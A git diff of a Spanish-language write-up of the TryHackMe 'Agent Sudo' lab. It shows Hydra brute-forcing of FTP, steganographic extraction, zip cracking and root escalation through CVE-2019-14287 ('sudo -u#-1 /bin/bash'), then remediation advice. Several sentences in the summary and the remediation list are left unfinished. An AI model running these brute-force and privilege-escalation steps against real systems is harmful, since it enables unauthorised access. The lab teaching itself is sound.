@@ -1,13 +1,18 @@
 ---
 title: "TryHackMe | Agent Sudo"
 published: 2025/05/30
+last-modified: 2026/02/05
 slug: "tryhackme-agent-sudo"
 image: "/writeups/tryhackme-agent-sudo/thumbnail.png"
 ---
-
-<img src="/writeups/tryhackme-agent-sudo/thumbnail.png" width=200px heigh=200px/>
-
 <https://tryhackme.com/room/agentsudoctf>
+
+<div id="summary">
+        <img src="/writeups/tryhackme-agent-sudo/thumbnail.png" id="summary-thumbnail"/>
+        <p id="summary-description">         
+                <b>Agent Sudo</b> es un desafio guiado de Linux de dificultad Facil de TryHackMe. El punto de apoyo inicial consiste en enviar solicitudes al servidor web con distintos valores en la cabecera User-Agent, correspondientes a las letras del abecedario, hasta encontrar un User-Agent en particular que . Este nombre de usuario es suficiente para obtener su contraseña correspondiente en el servicio FTP haciendo uso de fuerza bruta. Mediante ..., descargamos un ar La versión de sudo encontrada es antigua, y junto con la configuración en el archivo sudoers, permiten usar el CVE-2019-14287 para escalar privilegios a root.
+        </p>
+</div>
 
 ## Escaneo
 
@@ -24,11 +29,10 @@ sudo nmap -p- -n -Pn -T4 10.10.195.209 -oN nmap.txt
         <li><b>-p-:</b> Escanear todos los puertos.</li>
         <li><b>-n:</b/> No realizar resolución DNS.</li>
         <li><b>-Pn:</b/> Asumir que el <i>host</i> esta en linea para evitar que Nmap intente primero descubrirlo.</li>
-        <li><b>-T4:</b> Usar plantilla de temporizado 4 ("aggresive"). Esto no es necesario y podemos optar por usar la plantilla por defecto "normal" (-T3).</li>
-        <li><b>-oN [archivo]:</b> Escribir resultados en formato "normal" en el archivo indicado.</li>
+        <li><b>-T4:</b> Usar plantilla de temporizado 4 ("aggresive"). Esto no es necesario y podemos optar por usar la plantilla de temporizado por defecto "normal" (-T3).</li>
+        <li><b>-oN [archivo]:</b> Escribir los resultados en formato "normal" en el archivo indicado.</li>
 </ul>
 </details>
-
 
 ```text
 sudo nmap -p- -n -Pn -T4 10.10.195.209 -oN nmap.txt
@@ -107,7 +111,7 @@ ttpassgen -r "[?u]{1:1}" wordlist.txt
 <summary>Explicación del comando</summary>
 <ul>
         <li><b>ttpassgen:</b> Generador de listas de palabras altamente flexible escrito en Python.</li>
-        <li><b>-r [regla]:</b>Regla a usar (consultar el repositorio de GitHub para mayor información).</li>
+        <li><b>-r [regla]:</b> Regla a usar (consultar el repositorio de GitHub para mayor información).</li>
 </ul>
 </details>
 <br/>
@@ -121,7 +125,7 @@ Y
 Z
 ```
 
-Enviamos solicitudes con **ffuf**. Puesto que la lista de palabras es corta, y no sabemos exactamente que esperar de una respuesta adecuada, podemos optar por no filtrar las respuestas y examinarlas manualmente. Sin embargo, también podemos suponer que una respuesta adecuada contendrá un código de respuesta diferente a ``200 OK`` o tendrá un tamaño diferente al usual de 218 bytes.
+Para acceder al sitio, debemos de enviar solicitudes HTTP al servidor usando los valores generados anteriormente en la cabecera "User-Agent". Para esto usaremos **ffuf**. Puesto que la lista de palabras es corta, y no sabemos exactamente que esperar de una respuesta adecuada, podemos optar por no filtrar las respuestas y examinarlas manualmente. Sin embargo, también podemos suponer que una respuesta adecuada contendrá un código de respuesta diferente a ``200 OK`` o tendrá un tamaño diferente al usual de 218 bytes.
 
 Para propósitos educativos, elegiremos seguir las redirecciones y filtrar las respuestas basadas en su tamaño.
 
@@ -154,7 +158,7 @@ C                       [Status: 200, Size: 177, Words: 27, Lines: 8, Duration: 
 
 > La letra C originalmente nos redirige a otra pagina, mientras que la letra R nos muestra otro mensaje. Si hubiéramos filtrado todas las respuestas con código 200, hubiéramos omitido esta ultima respuesta.
 
-El User-Agent R y C retornan respuestas diferentes a la estándar. Al enviar una petición con la cabecera ``User-Agent: R``, obtenemos una respuesta ligeramente diferente a la original (pero sin importancia). La cabecera ``User-Agent: C`` nos revela una respuesta completamente diferente.
+El User-Agent "R" y "C" retornan respuestas diferentes a la estándar. Al enviar una petición con la cabecera ``User-Agent: R``, obtenemos una respuesta ligeramente diferente a la original (pero sin importancia). La cabecera ``User-Agent: C`` nos revela una respuesta completamente diferente.
 
 ```bash
 curl -sL -H "User-Agent: C" http://10.10.195.209/
@@ -174,13 +178,13 @@ curl -sL -H "User-Agent: C" http://10.10.195.209/
 
 Attention chris,
 
-Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
 
 From,
 Agent R
 ```
 
-Descubrimos el nombre de usuario ``chris`` y que su contraseña es débil.
+Descubrimos un posible nombre de usuario, ``chris``, y que su contraseña es débil.
 
 Si intentamos enumerar directorios y paginas web, tales como formularios de inicio de sesión, no obtendremos resultados.
 
@@ -227,7 +231,7 @@ hydra -l "chris" -P /usr/share/wordlists/rockyou.txt -f -vV 10.10.195.209 ftp
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-30 20:05:43
 ```
 
-Obtenemos la contraseña ``crystal``. Ingresamos al servidor ``FTP`` con estas credenciales y listamos los archivos.
+Obtenemos la contraseña valida ``crystal``. Ingresamos al servidor ``FTP`` con estas credenciales y listamos los archivos.
 
 ```text
 ftp> ls
@@ -253,7 +257,7 @@ local: cutie.png remote: cutie.png
 [...]
 ```
 
-> Usamos el comando *promt* para evitar tener que confirmar manualmente la descarga de cada archivo.
+> Usamos el comando *promt* para deshabilitar el modo interactivo, y asi evitar tener que confirmar manualmente la descarga de cada archivo.
 
 A simple vista, no hay nada fuera de lo usual en las imágenes descargadas. El archivo ``To_agentJ.txt`` contiene el siguiente mensaje.
 
@@ -268,7 +272,7 @@ Agent C
 
 ### Esteganografía
 
-Según el mensaje anterior, una de las imágenes contiene la contraseña de Agent R. Debemos realizar estegoanálisis en busca de un mensaje escondido. Podemos realizar este proceso con muchas herramientas, pero en CTFs usualmente podremos obtener información oculta haciendo uso de *exiftool*, *strings*, *binwalk* y *steghide* (no esperes hacer uso de estas herramientas en pruebas de penetración reales).
+Según el mensaje anterior, una de las imágenes contiene la contraseña de Agent R. Debemos realizar estegoanálisis en busca de un mensaje escondido. Podemos realizar este proceso con muchas herramientas, pero en CTFs usualmente podremos obtener información oculta haciendo uso de *exiftool*, *strings*, *binwalk* y *steghide*.
 
 La herramienta *exiftool* no revela nada importante en ambas imágenes. Pero **strings** revela algo en la imagen `cutie.png`.
 
@@ -279,11 +283,11 @@ strings cutie.png | head -n 20 && echo "....." && strings cutie.png | tail -n 20
 <details>
 <summary>Explicación del comando</summary>
 <ul>
-        <li><b>strings:</b> Mostrar cadenas de texto legibles para humanos.</li>
+        <li><b>strings [archivo]:</b> Mostrar cadenas de texto legibles para humanos.</li>
         <li><b>head:</b> Mostrar las primeras 10 lineas de un archivo.</li>
-        <li><b>-n [numero]:</b> Mostrar las primeras lineas.</li>
+        <li><b>-n [numero]:</b> Mostrar el numero indicado de las primeras lineas.</li>
         <li><b>tail:</b> Mostrar las ultimas 10 lineas de un archivo.</li>
-        <li><b>-n [numero]:</b> Mostrar las ultimas lineas.</li>
+        <li><b>-n [numero]:</b> Mostrar el numero indicado de las ultimas lineas.</li>
 </ul>
 </details>
 
@@ -298,7 +302,7 @@ To_agentR.txt
 EwwT
 ```
 
-Descubrimos que ``cutie.png`` contiene un archivo de texto incrustado. Para extraerlo hacemos uso de **binwalk**.
+Descubrimos que ``cutie.png`` contiene el archivo de texto ``To_agentR.txt`` incrustado. Para extraerlo hacemos uso de **binwalk**.
 
 ```bash
 binwalk -e cutie.png
@@ -325,7 +329,7 @@ WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Err
 WARNING: One or more files failed to extract: either no utility was found or it's unimplemented
 ```
 
-Los archivos fueron extraídos en la carpeta ``_cutie.png.extracted``. Dentro de esta carpeta encontramos el archivo ``8702.zip`` que no pudo ser extraído automáticamente. Sin embargo *unzip* falla en extraer este archivo, por lo que debemos de usar **7zip**.
+Los archivos fueron extraídos en la carpeta ``_cutie.png.extracted``. Dentro de esta carpeta encontramos el archivo ``8702.zip`` que no pudo ser extraído automáticamente. *unzip* falla en extraer este archivo, por lo que debemos de usar **7zip**.
 
 ```bash
 7zip x 8702.zip
@@ -364,7 +368,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt zip2john.txt
 <summary>Explicación del comando</summary>
 <ul>
         <li><b>john:</b> Recuperador de contraseñas.</li>
-        <li><b>--wordlist [lista de palabras]:</b> Lista de palabras a usar.</li>
+        <li><b>--wordlist=[lista de palabras]:</b> Lista de palabras a usar.</li>
 </ul>
 </details>
 
@@ -403,10 +407,10 @@ strings cute-alien.png | head -n 20 && echo "....." && strings cute-alien.png | 
 <summary>Explicación del comando</summary>
 <ul>
         <li><b>strings:</b> Mostrar cadenas de texto legibles para humanos.</li>
-        <li><b>head:</b> Mostrar las primeras 10 lineas de un archivo.</li>
+        <li><b>head:</b> Mostrar el numero indicado de las primeras 10 lineas de un archivo.</li>
         <li><b>-n [numero]:</b> Mostrar las primeras lineas.</li>
         <li><b>tail:</b> Mostrar las ultimas 10 lineas de un archivo.</li>
-        <li><b>-n [numero]:</b> Mostrar las ultimas lineas.</li>
+        <li><b>-n [numero]:</b> Mostrar el numero indicado de las ultimas lineas.</li>
 </ul>
 </details>
 
@@ -471,11 +475,11 @@ chris
 
 Descubrimos el usuario ``james`` y su contraseña ``hackerrules!``. Usamos estas credenciales para ingresar al servidor SSH.
 
-Dentro de la carpeta *home* de nuestro usuario encontraremos la bandera del usuario y la imagen ``Alien_autospy.jpg`` que contiene la respuesta a la pregunta "What is the incident of the photo called?". Para copiar la imagen a nuestra maquina local puedes usar el comando ``scp james@10.10.195.209/Alien_autospy.jpg .`` en una nueva terminal y luego ingresar la contraseña de *james*.
+## Enumeración post-explotación
 
-## Escalada de privilegios
+Dentro de la carpeta *home* de nuestro usuario encontramos la bandera del usuario y la imagen ``Alien_autospy.jpg`` que contiene la respuesta a la pregunta "What is the incident of the photo called?". Para copiar la imagen a nuestra maquina local podemos usar el comando ``scp james@10.10.195.209/Alien_autospy.jpg .`` en una nueva terminal y luego ingresar la contraseña de *james*.
 
-Enumeramos el usuario actual. Una de las primeras cosas que debemos hacer en CTFs cuando obtenemos un *foothold* en la maquina objetivo es ingresar el comando ``sudo -ll`` (en este caso deberemos usar ``sudo -l`` por razones que explicare mas adelante).
+Enumeramos el usuario actual. Comenzamos usando el comando ``sudo -ll`` (en este caso deberemos usar ``sudo -l`` por razones que explicare mas adelante).
 
 ```text
 james@agent-sudo:~$ sudo -l
@@ -492,17 +496,42 @@ User james may run the following commands on agent-sudo:
 <summary>Explicación del comando</summary>
 <ul>
         <li><b>sudo:</b> Ejecutar comandos como otro usuario.</li>
-        <li><b>-l:</b> Listar los privilegios del usuario invocador (si no se especifica con la opción -U).</li>
+        <li><b>-l:</b> Listar los privilegios del usuario invocador (si el usuario no se especifica con la opción -U).</li>
 </ul>
 </details>
 
 > Aunque la salida del comando ``sudo -ll`` tiene un formato mas legible que ``sudo -l``, la linea ``(ALL, !root) /bin/bash`` sera clave para identificar la vulnerabilidad.
 
-La salida del comando anterior puede resultar poco clara, pero esta nos informa que el usuario ``james`` puede ejecutar el comando ``/bin/bash`` como cualquier usuario excepto ``root``. Parece seguro ¿No? En realidad existe un CVE especifico para esta situación que nos permitirá escalar nuestros privilegios a root.
+La salida del comando anterior puede resultar poco clara, pero esta nos informa que el usuario ``james`` puede ejecutar el comando ``/bin/bash`` como cualquier usuario excepto ``root``. Parece seguro, ¿no? En realidad existe un CVE especifico para esta situación que nos permitirá escalar nuestros privilegios a ``root``.
 
-Para identificar esta vulnerabilidad podemos buscar la frase ``(ALL, !root) /bin/bash`` (¿No te parece inusual o demasiado especifica?) en el motor de búsqueda de tu preferencia y se nos apuntara al CVE-2019-14287. Todas las versiones de Sudo anteriores a 1.8.28 presentan una falla en la ejecución de comandos con un User ID (UID) arbitrario.  Alternativamente, podemos usar herramientas de enumeración como ``linpeas`` o ``LinEnum`` para identificar que la versión de sudo es vulnerable a este CVE.
+## Escalada de privilegios
 
-Podemos comprobar que la versión de sudo presente en la maquina objetivo es vulnerable a este CVE.
+Para identificar esta vulnerabilidad podemos buscar la frase ``(ALL, !root) /bin/bash`` (¿no te parece inusual, o demasiado especifica?) en el motor de búsqueda de tu preferencia y los primeros resultados nos apuntaran al CVE-2019-14287. Alternativamente, podemos usar herramientas de enumeración como ``linpeas`` o ``LinEnum`` para identificar que la versión de sudo es vulnerable a este CVE.
+
+### CVE-2019-14287
+
+Todas las versiones de Sudo anteriores a 1.8.28 presentan una falla en la ejecución de comandos con un User ID (UID) arbitrario, que permite a un atacante evadir restricciones de seguridad y ejecutar comandos como el usuario ``root`` si una entrada del archivo ``sudoers`` esta configurada para permitir ejecución de comandos como cualquier usuario excepto ``root``.  
+
+El signo de exclamación (!) indica exclusión. En este caso ``root`` es identificado por su nombre, y se excluye la ejecución de cierto comando para este usuario, pero se permite la ejecución del comando para el resto de usuarios.
+
+```text
+someuser ALL=(ALL, !root) /usr/bin/somecommand
+```
+
+El anterior caso corresponde a la configuración de ``sudoers`` presente en la maquina objetivo, sin embargo, el usuario ``root`` tambien puede ser identificado por su UID.
+
+```text
+someuser ALL=(ALL, !#0) /usr/bin/somecommand
+```
+
+O puede ser referenciado con un alias.
+
+```text
+Runas_Alias MYGROUP = root, adminuser
+someuser ALL=(ALL, !MYGROUP) /usr/bin/somecommand
+```
+
+Podemos comprobar que la versión de ``sudo`` presente en la maquina objetivo es vulnerable a este CVE.
 
 ```text
 james@agent-sudo:~$ sudo --version
@@ -513,9 +542,25 @@ Sudoers file grammar version 46
 Sudoers I/O plugin version 1.8.21p2
 ```
 
-Para explicar mejor esta vulnerabilidad, es necesario saber que el usuario root siempre tendrá un UID de 0 y que un usuario en Linux también puede ser referenciado directamente haciendo uso de su UID. Por ejemplo, tanto el comando ``id root`` como ``id 0`` mostraran los identificadores del usuario root. En el caso del comando ``sudo``, la opción ``-u`` (usada para ejecutar un comando como otro usuario) admite UIDs haciendo uso del formato ``#uid``. De esta forma podríamos ejecutar un comando como root haciendo uso de ``sudo -u#0 [comando]``.
+Para explicar mejor esta vulnerabilidad, es necesario saber que el usuario ``root`` siempre tendrá un UID de 0 y que un usuario en Linux también puede ser referenciado directamente haciendo uso de su UID. Por ejemplo, tanto el comando ``id root`` como ``id 0`` mostraran los identificadores del usuario ``root``. En el caso del comando ``sudo``, la opción ``-u`` (usada para ejecutar un comando como otro usuario) admite UIDs haciendo uso del formato ``#uid``. De esta forma podemos ejecutar un comando como ``root`` haciendo uso del comando ``sudo -u#0 [comando]``.
 
-La vulnerabilidad reside en el hecho de que un UID . Esta falla solo afecta a configuraciones de sudo donde alguna entrada en el archivo sudoers permite ejecutar un comando como cualquier usuario excepto root.
+La vulnerabilidad reside en el hecho de que cuando se ejecuta ``sudo``, este es ejecutado inicialmente como ``root``, y luego se cambia el UID efectivo del proceso mediante las llamadas al sistema ``setresuid`` y ``setreuid``. Sin embargo, -1 es un valor especial en estas llamadas al sistema.
+
+Segun el [manual de setresuid](https://linux.die.net/man/2/setresuid):
+
+```text
+Si uno de los argumentos equivale a -1, el valor correspondiente no sera cambiado.
+```
+
+Segun el [manual de setreuid](https://linux.die.net/man/2/setreuid):
+
+```text
+Ingresar un valor de -1 para el ID de usuario efectivo o real fuerza al sistema a dejar el ID sin cambios.
+```
+
+Por tanto, al ingresar un UID de -1 en ``sudo``, el proceso sera ejecutado inicialmente como ``root`` y el UID sera enviado como parámetro a ``setresuid`` y ``setreuid``. Pero al ser -1, el UID efectivo no sera cambiado, por lo que el proceso terminara siendo ejecutado como ``root``. El UID 4294967295 es equivalente a -1, y tambien puede ser usado para escalar privilegios.
+
+Para escalar privilegios tan solo debemos de ejecutar ``/bin/bash`` con el UID de -1.
 
 ```bash
 sudo -u#-1 /bin/bash
@@ -536,23 +581,23 @@ root@agent-sudo:~# id
 uid=0(root) gid=1000(james) groups=1000(james)
 ```
 
-Dentro de la carpeta ``/root`` encontraremos la bandera de root y la respuesta a la pregunta bonus.
-
-## Persistencia
-
-Ahora que hemos escalado privilegios a ``root``, deberiamos de crear un *backdoor* para asegurar la persistencia del ingreso a una cuenta con altos privilegios en esta maquina. Existen distintas formas para crear un *backdoor* que nos permita acceder directamente al usuario ``root``, pero teniendo en cuenta que muchas de ellas requieren de la posterior interacción de esta cuenta (como iniciar sesión) por parte de otra persona, 
-
-## Resumen ejecutivo
-
-Descripción
+Dentro de la carpeta ``/root`` encontraremos la bandera de ``root`` y la respuesta a la pregunta bonus.
 
 ## Remediación
 
-1. Evita el uso de contraseñas débiles.
-2. Actualiza ``sudo`` a la ultima versión disponible haciendo uso del gestor de paquetes de tu sistema operativo.
+1. Evita el uso de contraseñas débiles. Se recomienda alinear la politica de contraseñas de la organización a las [pautas de NIST de identidad digital](https://pages.nist.gov/800-63-4/), en especifico a las [pautas de autenticación y autorización](https://pages.nist.gov/800-63-4/sp800-63b.html). De forma general, estas recomiendan:
+   1. a
+   2. b
+2. Evita la reutilización de contraseñas. Asegura el uso de contraseñas unicas y fuertes para cada cuenta, dispositivo y servicio protegido. Utiliza gestores de contraseñas locales como KeePassXC para generar y almacenar contraseñas de forma segura.
+3. Actualiza sudo a la versión 1.8.28 o mayor, preferiblemente a la ultima versión disponible, haciendo uso del gestor de paquetes del sistema operativo del servidor. La versión 1.8.28 de sudo corrige el CVE-2019-14287 al evitar el uso de UIDs equivalentes a -1.
 
 ## Conclusiones
 
 Este es un desafio relativamente facil. Introduce a los principiantes a la enumeración basica de servicios de red, ataques de fuerza bruta, *crackeo* de contraseñas y metodos basicos de ingenieria inversa. La parte mas complicada es descubrir la pagina oculta haciendo uso de un metodo muy inusual, y realizar esteganografía a las imagenes descargadas (y saber que esto se debe realizar en primer lugar).
 
-Eventualmente tenemos la oportunidad de explotar el CVE-2019-14287, que aunque pueda resultar peligroso debido a la posibilidad de escalar privilegios con un unico comando, requiere de entradas muy especificas en el archivo sudoers y de una versión de sudo del 2019 (el cual se puede actualizar facilmente con el gestor de paquetes del sistema operativo). Por supuesto, el desafio fue creado poco despues de la divulgación del CVE, pero en un contexto actual esta vulnerabilidad es muy poco probable que este presente.
+Eventualmente tenemos la oportunidad de explotar el CVE-2019-14287, que aunque pueda resultar peligroso debido a la posibilidad de escalar privilegios con un unico comando, requiere de entradas muy especificas en el archivo sudoers y de una versión de sudo del 2019 (el cual se puede actualizar facilmente con el gestor de paquetes del sistema operativo). Por supuesto, el desafio fue creado poco despues de la divulgación del CVE, pero en un contexto actual, esta vulnerabilidad es muy poco probable que este presente en entornos reales.
+
+## Referencias
+- https://nvd.nist.gov/vuln/detail/CVE-2019-14287
+- https://access.redhat.com/solutions/4502891
+- https://my.f5.com/manage/s/article/K53746212
